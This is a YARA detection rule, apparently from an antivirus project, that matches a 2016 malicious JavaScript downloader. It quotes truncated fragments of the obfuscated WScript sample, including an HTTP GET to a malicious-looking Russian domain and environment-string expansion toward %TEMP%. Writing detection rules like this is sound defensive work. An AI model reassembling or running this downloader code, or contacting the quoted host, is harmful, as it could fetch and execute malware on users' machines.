rule sig_20160428_6f7a921ce7068ec76995ba1da261f663 {
  meta:
    description = "datamaliciousorder - file 20160428_6f7a921ce7068ec76995ba1da261f663.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "dd3f49e351f5bbc812d11b4411ffa7e8c12106bbb3ecc9f59d3aedfcef697066"

  strings:
    $s1  = "function FsuTemLwqOtrXteGiiAmg(EvnNhdFonTpzQuhNzeMnr){ZvhJxhMzlMqwOhqLwnTlc[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function FsuTemLwqOtrXteGiiAmg(EvnNhdFonTpzQuhNzeMnr){ZvhJxhMzlMqwOhqLwnTlc[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function NbzDunWhiGesIeqCxhJpn() {return ZvhJxhMzlMqwOhqLwnTlc[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "var ZvhJxhMzlMqwOhqLwnTlc = function AmbJzxJdjLqqTrrPetTcg() {return XgiGynXjvOqdPaaUedXqa[AmyUuySszGvsQdjYrbAju](\"WScript\"+\"" ascii
    $s5  = "function BlfTfnDkgSelSjlYzcPkr(XtwPbrKunGzpAftNceHyv, UokMlnZapGtvYikBokRet){NbyDlvJhbArnGdpLsoUgt = NbyDlvJhbArnGdpLsoUgt * 1; " ascii
    $s6  = "return XtwPbrKunGzpAftNceHyv - UokMlnZapGtvYikBokRet;};" fullword ascii
    $s7  = "DgrBdsFsaTzmVkdJerKzo[XlaTavYvqYcwChlNkoWln](\"G\" + \"ET\", \"http://sarsudexpert.ru/q2ikcxz\", false);" fullword ascii
    $s8  = "var XgiGynXjvOqdPaaUedXqa = this[\"WScript\"];" fullword ascii
    $s9  = "var ZvhJxhMzlMqwOhqLwnTlc = function AmbJzxJdjLqqTrrPetTcg() {return XgiGynXjvOqdPaaUedXqa[AmyUuySszGvsQdjYrbAju](\"WScript\"+\"" ascii
    $s10 = "function NbzDunWhiGesIeqCxhJpn() {return ZvhJxhMzlMqwOhqLwnTlc[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function WsoPqtScfVyoTqtOchAph(){return BjpLdiYzuVujFrwXcgVwj + \"\";};" fullword ascii
    $s12 = "function BlfTfnDkgSelSjlYzcPkr(XtwPbrKunGzpAftNceHyv, UokMlnZapGtvYikBokRet){NbyDlvJhbArnGdpLsoUgt = NbyDlvJhbArnGdpLsoUgt * 1; " ascii
    $s13 = "if (DgrBdsFsaTzmVkdJerKzo[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "var RmdScgOqlHimPyuZtlLxe = new this[\"D\"+\"ate\"]();" fullword ascii
    $s15 = "function IloUntWisGhpUdpEfnSfq(){return AmyUuySszGvsQdjYrbAju;};" fullword ascii
    $s16 = "var ZkgQigDetVutGzeLxxWqk = false;" fullword ascii
    $s17 = "ZkgQigDetVutGzeLxxWqk = true;" fullword ascii
    $s18 = "}while (IccHutYeaUufHszGtgGuw);" fullword ascii
    $s19 = "function HcbQruRueFezDsdHtsFwd(BupAgkOlqGraQhzRvcKhf) {var QjzJqwZtaUzyNbhZppWcf = (1, 2, 3, 4, 5, BupAgkOlqGraQhzRvcKhf); retur" ascii
    $s20 = "function HcbQruRueFezDsdHtsFwd(BupAgkOlqGraQhzRvcKhf) {var QjzJqwZtaUzyNbhZppWcf = (1, 2, 3, 4, 5, BupAgkOlqGraQhzRvcKhf); retur" ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}